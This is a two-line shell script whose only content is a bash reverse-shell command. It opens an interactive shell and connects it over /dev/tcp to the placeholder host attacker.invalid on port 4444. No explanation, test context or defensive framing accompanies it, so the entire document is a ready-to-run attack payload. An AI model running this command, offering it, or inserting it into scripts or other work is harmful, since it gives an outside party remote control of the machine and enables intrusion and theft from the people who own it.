#!/bin/sh
bash -i >& /dev/tcp/attacker.invalid/4444 0>&1
